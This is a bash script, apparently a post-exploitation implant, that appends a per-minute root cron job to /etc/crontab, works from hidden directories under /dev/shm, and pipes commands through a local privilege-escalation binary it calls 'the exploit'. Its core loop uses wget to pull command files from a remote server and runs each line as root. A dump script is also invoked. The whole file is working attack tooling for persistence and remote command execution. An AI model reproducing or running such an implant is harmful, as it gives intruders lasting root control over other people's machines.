#!/bin/bash
# implants a cron job into /etc/crontab directly
#	grabs a file from the server with commands inside it
#		for every line in the file it executes as root
URL="http://192.168.1.XXX/"
#URL=192.168.1.30

PE=lspge
POST=post.sh
DUMP=dump.sh
CMD=cmnd.sh

ADD=`/sbin/ifconfig | grep 'Bcast' | cut -d ':' -f 2 | cut -d ' ' -f 1 | cut -d '.' -f 4`
FILE=file_$ADD
#FIRST=first_$FILE

CMNDS=( $FILE $FIRST )

DIR=/dev/shm/
TOOLS=.tools/
#HIDE=.havoc/

cd $DIR

function download_command_files {
	for file in ${CMNDS[@]}
	do
		# -N only replaces if new -q quiets the output
		echo "wget -O $file $URL$file" | ./$PE
	done
}

function run {
	# running the command into the exploit
	# possibly overdone if the cron is run as root
	while read -r line
	do
		echo $line | ./$PE
	done < $1
}

function first_run {
	#download_command_files
    printf "*/1 * * * * \troot \t/bin/bash -c '/dev/shm/.tools/cmnd.sh -c' \n" >> /etc/crontab
	$DIR$TOOLS./$DUMP
    #dir_and_tools
	#run $FIRST 
}

function running_from_cron {
    
	cd $DIR$TOOLS
	download_command_files
	
	run $FILE
}

function dir_and_tools {
 
if [ ! -d $DIR$HIDE ]; then
    # if dir doesn't exist
    echo "mkdir $DIR$HIDE" | $DIR$TOOLS./$PE
fi

# copy over all the tools
if [ ! -f $DIR$HIDE$PE ]; then
    echo "cp $PE $DIR$HIDE" | $DIR$TOOLS./$PE
fi

if [ ! -f $DIR$HIDE$POST ]; then
    echo "cp $POST $DIR$HIDE" | $DIR$TOOLS./$PE
fi

if [ ! -f $DIR$HIDE$DUMP ]; then
    echo "cp $DUMP $DIR$HIDE" | $DIR$TOOLS./$PE
fi

if [ ! -f $DIR$HIDE$CMD ]; then
    echo "cp $CMD $DIR$HIDE" | $DIR$TOOLS./$PE
fi

cd $DIR$HIDE

}

case "$1" in
	-c) running_from_cron
	    ;;
	 *) first_run
	    ;;
esac

exit 0

